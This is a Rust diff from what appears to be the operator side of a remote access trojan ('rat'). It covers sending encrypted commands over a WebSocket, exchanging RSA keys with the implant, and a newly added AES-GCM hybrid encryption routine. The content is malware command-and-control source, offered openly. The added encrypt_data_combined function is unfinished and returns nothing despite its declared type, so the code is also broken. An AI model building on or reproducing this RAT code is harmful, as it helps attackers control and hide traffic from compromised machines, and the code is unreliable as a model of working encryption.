@@ -1,16 +1,20 @@
 use core::str;
 use std::net::{IpAddr, SocketAddr};
 
+use aes_gcm::{aead::Aead, Aes256Gcm, KeyInit, Nonce};
 use futures_util::{
     stream::{SplitSink, SplitStream},
     SinkExt, StreamExt,
 };
+use rand::{rngs::OsRng, RngCore};
 use rsa::{
     pkcs1::{DecodeRsaPublicKey, EncodeRsaPrivateKey, EncodeRsaPublicKey},
     Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
 };
 use tokio_tungstenite::WebSocketStream;
 use tungstenite::Message;
+
+use super::hybrid_encryption_result::HybridEncryptionResult;
 
 pub const FEATURES: [&str; 5] = [
     "update",
@@ -92,14 +96,12 @@ impl Instance {
         self.write.send(Message::from(message)).await.unwrap();
     }
     pub async fn send_encrypted_message(&mut self, message: &str) {
-        let encrypted_data = self.encrypt_data(None, message.as_bytes());
+        let encrypted_data = self.encrypt_data(message.as_bytes());
+        //dont need hex cuz Aes
         self.write
-            .send(Message::from(hex::encode(encrypted_data)))
+            .send(Message::from(encrypted_data))
             .await
             .unwrap();
-    }
-    pub async fn send_chosen_command(&mut self, command: String) {
-        self.send_encrypted_message(&command).await;
     }
     pub async fn init_keys(&mut self) -> (String, String) {
         //Send pong for rat to generate a public key
@@ -121,7 +123,6 @@ impl Instance {
 
             //Send my public key encrypted by users public key to user and forget about it
             let encrypted_key = &self.encrypt_my_key(
-                &self.public_key.clone().unwrap(),
                 private_key
                     .to_public_key()
                     .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
@@ -153,28 +154,34 @@ impl Instance {
         RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key")
     }
 
-    fn encrypt_my_key(&self, public_key: &RsaPublicKey, data_to_enc: &[u8]) -> (Vec<u8>, Vec<u8>) {
+    fn encrypt_my_key(&self, data_to_enc: &[u8]) -> (Vec<u8>, Vec<u8>) {
         let mid = data_to_enc.len() / 2;
         (
-            self.encrypt_data(Some(public_key), &data_to_enc[..mid]),
-            self.encrypt_data(Some(public_key), &data_to_enc[mid..]),
+            self.encrypt_data(&data_to_enc[..mid]),
+            self.encrypt_data(&data_to_enc[mid..]),
         )
     }
-    pub fn encrypt_data(&self, public_key: Option<&RsaPublicKey>, data_to_enc: &[u8]) -> Vec<u8> {
+    pub fn encrypt_data_combined(&self, data_to_enc: Vec<u8>) -> HybridEncryptionResult {
+        //Aes key generation
+        let aes_key = Aes256Gcm::generate_key(&mut OsRng);
+
+        // Encrypt file with AES
+        let cipher = Aes256Gcm::new(&aes_key);
+        let mut nonce_bytes = [0u8; 12];
+        OsRng.fill_bytes(&mut nonce_bytes);
+        let nonce = Nonce::from_slice(&nonce_bytes);
+
+        let cyphertext = cipher.encrypt(nonce, data_to_enc.as_ref());
+    }
+    pub fn encrypt_data(&self, data_to_enc: &[u8]) -> Vec<u8> {
+        //rng for RSA
         let mut rng = rand::thread_rng();
-        //Yes this is neccessary if we need to use different public key
-        match public_key {
-            Some(public_key) => public_key
-                .clone()
-                .encrypt(&mut rng, Pkcs1v15Encrypt, data_to_enc)
-                .expect("failed to encrypt"),
-            None => self
-                .public_key
-                .clone()
-                .unwrap()
-                .encrypt(&mut rng, Pkcs1v15Encrypt, data_to_enc)
-                .expect("failed to encrypt"),
-        }
+
+        self.public_key
+            .clone()
+            .unwrap()
+            .encrypt(&mut rng, Pkcs1v15Encrypt, data_to_enc)
+            .expect("failed to encrypt")
     }
     pub fn decrypt_data(&self, data_to_decrypt: &[u8]) -> String {
         let decrypted_data = self
